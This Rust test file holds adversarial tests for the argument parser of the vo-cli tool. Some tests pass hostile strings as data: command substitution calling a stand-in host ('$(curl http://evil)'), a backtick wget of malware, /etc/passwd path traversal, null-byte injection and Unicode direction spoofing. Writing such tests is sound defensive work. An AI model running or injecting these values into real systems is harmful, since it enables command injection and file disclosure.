//! RED-QUEEN coevolutionary adversarial tests for vo-cli hardline command.
//! Flag mutations, edge cases, adversarial inputs.

use std::ffi::OsString;
use vo_cli::cli::{interpret_cli_from, CliError, Command};
use vo_cli::map_error_to_exit_code;

fn exit_code(args: Vec<&str>) -> i32 {
    map_error_to_exit_code(&interpret_cli_from(args).unwrap_err())
}

// ============================================================
// Hardline command tests
// ============================================================

#[test]
fn rq_hardline_rejects_empty_target() {
    assert!(interpret_cli_from(["vo", "hardline", ""]).is_err());
}

#[test]
fn rq_hardline_shell_metachar_passthrough() {
    let payload = "$(curl http://evil)";
    let cli = interpret_cli_from(["vo", "hardline", payload]).unwrap();
    if let Command::Hardline { target, .. } = cli.command {
        assert_eq!(target, payload);
    }
}

#[test]
fn rq_hardline_backtick_substitution_literal() {
    let payload = "`wget malware.sh`";
    let cli = interpret_cli_from(["vo", "hardline", payload]).unwrap();
    if let Command::Hardline { target, .. } = cli.command {
        assert_eq!(target, payload);
    }
}

#[test]
fn rq_hardline_path_traversal_accepted_raw() {
    let cli = interpret_cli_from(["vo", "hardline", "/../../../etc/passwd"]).unwrap();
    if let Command::Hardline { target, .. } = cli.command {
        assert_eq!(target, "/../../../etc/passwd");
    }
}

#[test]
fn rq_hardline_double_dash_escape_handled() {
    let cli = interpret_cli_from(["vo", "hardline", "--", "--force"]).unwrap();
    if let Command::Hardline { target, .. } = cli.command {
        assert_eq!(target, "--force");
    }
}

#[test]
fn rq_hardline_force_and_dry_run_mutually_exclusive() {
    let cli = interpret_cli_from(["vo", "hardline", "target-1", "--force", "--dry-run"]).unwrap();
    if let Command::Hardline { force, dry_run, .. } = cli.command {
        assert!(force && dry_run);
    }
}

#[test]
fn rq_hardline_unicode_spoof_accepted() {
    let payload = "target-\u{FF11}\u{FF12}";
    let cli = interpret_cli_from(["vo", "hardline", payload]).unwrap();
    if let Command::Hardline { target, .. } = cli.command {
        assert_eq!(target, payload);
    }
}

#[test]
fn rq_hardline_rlo_spoof_in_target() {
    let payload = "normal\u{202E}file.txt";
    let cli = interpret_cli_from(["vo", "hardline", payload]).unwrap();
    if let Command::Hardline { target, .. } = cli.command {
        assert_eq!(target, payload);
    }
}

#[test]
fn rq_hardline_null_byte_truncation_test() {
    let payload = "safe\0;malware";
    let cli = interpret_cli_from(["vo", "hardline", payload]).unwrap();
    if let Command::Hardline { target, .. } = cli.command {
        assert_eq!(target, payload);
    }
}

#[test]
fn rq_hardline_missing_target_fails() {
    assert!(interpret_cli_from(["vo", "hardline"]).is_err());
}

#[test]
fn rq_hardline_unknown_flag_maps_to_exit_2() {
    let err = interpret_cli_from(["vo", "hardline", "t", "--bogus"]).unwrap_err();
    assert_eq!(map_error_to_exit_code(&CliError::from(err)), 2);
}

#[test]
fn rq_hardline_4kb_target_accepted() {
    let payload: String = "t".repeat(4096);
    let cli = interpret_cli_from(["vo", "hardline", &payload]).unwrap();
    if let Command::Hardline { target, .. } = cli.command {
        assert_eq!(target.len(), 4096);
    }
}

#[test]
fn rq_hardline_custom_engine_url_flag() {
    let cli = interpret_cli_from([
        "vo",
        "hardline",
        "my-target",
        "--engine-url",
        "http://localhost:9999",
    ])
    .unwrap();
    if let Command::Hardline { engine_url, .. } = cli.command {
        assert_eq!(engine_url, "http://localhost:9999");
    }
}

#[test]
fn rq_hardline_timeout_flag_accepts_valid_value() {
    let cli = interpret_cli_from(["vo", "hardline", "t", "--timeout", "300"]).unwrap();
    if let Command::Hardline { timeout, .. } = cli.command {
        assert_eq!(timeout, 300);
    }
}

// ============================================================
// RQ-HARDLINE-001: Status command edge cases
// ============================================================

#[test]
fn rq_status_accepts_8kb_instance_id() {
    let id: String = "wf-".to_string() + &"x".repeat(8192);
    let cli = interpret_cli_from(["vo", "status", &id]).unwrap();
    if let Command::Status { instance, .. } = cli.command {
        assert_eq!(instance.len(), 8195);
    }
}

#[test]
fn rq_status_accepts_namespaced_instance() {
    let cli = interpret_cli_from(["vo", "status", "namespace/01ARZ3NDEKTSV4RRFFQ69G5FAV"]).unwrap();
    assert!(matches!(cli.command, Command::Status { .. }));
}

#[test]
fn rq_status_rejects_missing_instance() {
    assert!(interpret_cli_from(["vo", "status"]).is_err());
}

#[test]
fn rq_status_rejects_empty_instance() {
    assert!(interpret_cli_from(["vo", "status", ""]).is_err());
}

// ============================================================
// RQ-HARDLINE-002: Lock command edge cases
// ============================================================

#[test]
fn rq_lock_accepts_deep_relative_path() {
    let cli = interpret_cli_from(["vo", "lock", "--project-dir", "a/b/c/d/e/f"]).unwrap();
    if let Command::Lock { project_dir } = cli.command {
        assert_eq!(project_dir, std::path::PathBuf::from("a/b/c/d/e/f"));
    }
}

#[test]
fn rq_lock_accepts_absolute_path() {
    let cli = interpret_cli_from(["vo", "lock", "--project-dir", "/tmp/vo-lock-test"]).unwrap();
    if let Command::Lock { project_dir } = cli.command {
        assert_eq!(project_dir, std::path::PathBuf::from("/tmp/vo-lock-test"));
    }
}

#[test]
fn rq_lock_accepts_dot_path() {
    let cli = interpret_cli_from(["vo", "lock", "--project-dir", "."]).unwrap();
    if let Command::Lock { project_dir } = cli.command {
        assert_eq!(project_dir, std::path::PathBuf::from("."));
    }
}

// ============================================================
// RQ-HARDLINE-003: Doctor command edge cases
// ============================================================

#[test]
fn rq_doctor_accepts_deep_nested_project_dir() {
    let cli = interpret_cli_from(["vo", "doctor", "--project-dir", "a/b/c/d/e/f/g/h"]).unwrap();
    if let Command::Doctor { project_dir } = cli.command {
        assert_eq!(project_dir, std::path::PathBuf::from("a/b/c/d/e/f/g/h"));
    }
}

#[test]
fn rq_doctor_accepts_root_path() {
    let cli = interpret_cli_from(["vo", "doctor", "--project-dir", "/"]).unwrap();
    if let Command::Doctor { project_dir } = cli.command {
        assert_eq!(project_dir, std::path::PathBuf::from("/"));
    }
}

// ============================================================
// RQ-HARDLINE-004: Rebuild flag combinations
// ============================================================

#[test]
fn rq_rebuild_all_three_flags_together() {
    let cli = interpret_cli_from([
        "vo",
        "rebuild",
        "--force",
        "--list",
        "--projection-id",
        "proj-123",
    ])
    .unwrap();
    if let Command::Rebuild {
        force,
        list_projections,
        projection_id,
        ..
    } = cli.command
    {
        assert!(force);
        assert!(list_projections);
        assert_eq!(projection_id, Some("proj-123".to_string()));
    }
}

#[test]
fn rq_rebuild_projection_id_4kb() {
    let id: String = "proj-".to_string() + &"a".repeat(4096);
    let cli = interpret_cli_from(["vo", "rebuild", "--projection-id", &id]).unwrap();
    if let Command::Rebuild { projection_id, .. } = cli.command {
        assert_eq!(projection_id.unwrap().len(), 4104);
    }
}

#[test]
fn rq_rebuild_list_without_projection_id() {
    let cli = interpret_cli_from(["vo", "rebuild", "--list"]).unwrap();
    if let Command::Rebuild {
        list_projections,
        projection_id,
        ..
    } = cli.command
    {
        assert!(list_projections);
        assert!(projection_id.is_none());
    }
}

// ============================================================
// RQ-HARDLINE-005: Exit code verification
// ============================================================

#[test]
fn rq_exit_code_2_for_missing_required_arg() {
    assert_eq!(exit_code(vec!["vo", "status"]), 2);
}

#[test]
fn rq_exit_code_2_for_unknown_flag() {
    assert_eq!(exit_code(vec!["vo", "check", "--bogus"]), 2);
}

#[test]
fn rq_exit_code_2_for_invalid_subcommand() {
    assert_eq!(exit_code(vec!["vo", "nonexistent"]), 2);
}

#[test]
fn rq_exit_code_2_for_garbage_after_subcommand() {
    assert_eq!(exit_code(vec!["vo", "check", "/tmp", "garbage"]), 2);
}

#[test]
fn rq_exit_code_2_for_lock_as_flag() {
    assert_eq!(exit_code(vec!["vo", "--lock"]), 2);
}

#[test]
fn rq_exit_code_2_for_doctor_as_flag() {
    assert_eq!(exit_code(vec!["vo", "--doctor"]), 2);
}

// ============================================================
// RQ-HARDLINE-006: Unicode and encoding edge cases
// ============================================================

#[test]
fn rq_status_accepts_cyrillic_workflow_id() {
    let cli = interpret_cli_from(["vo", "status", "wf-тест"]).unwrap();
    if let Command::Status {
        workflow_id: instance,
        ..
    } = cli.command
    {
        assert_eq!(instance, "wf-тест");
    }
}

#[test]
fn rq_status_accepts_emoji_in_instance() {
    let cli = interpret_cli_from(["vo", "status", "wf-🔥-123"]).unwrap();
    if let Command::Status {
        workflow_id: instance,
        ..
    } = cli.command
    {
        assert_eq!(instance, "wf-🔥-123");
    }
}

#[test]
fn rq_lock_rejects_path_with_newline() {
    let args: Vec<OsString> = vec!["vo".into(), "lock".into(), "--project-dir\n".into()];
    assert!(interpret_cli_from(args).is_err());
}

#[test]
fn rq_doctor_rejects_path_with_null_byte() {
    let args: Vec<OsString> = vec!["vo".into(), "doctor".into(), "--project-dir\0".into()];
    assert!(interpret_cli_from(args).is_err());
}

// ============================================================
// RQ-HARDLINE-007: Flag prefix attacks
// ============================================================

#[test]
fn rq_reject_single_dash_for_long_flags() {
    assert!(interpret_cli_from(["vo", "rebuild", "-force"]).is_err());
    assert!(interpret_cli_from(["vo", "rebuild", "-list"]).is_err());
}

#[test]
fn rq_reject_flag_stuttering() {
    assert!(interpret_cli_from(["vo", "rebuild", "--force", "--force"]).is_err());
}

#[test]
fn rq_reject_partial_flag_prefix() {
    assert!(interpret_cli_from(["vo", "rebuild", "--forc"]).is_err());
    assert!(interpret_cli_from(["vo", "rebuild", "--lis"]).is_err());
}
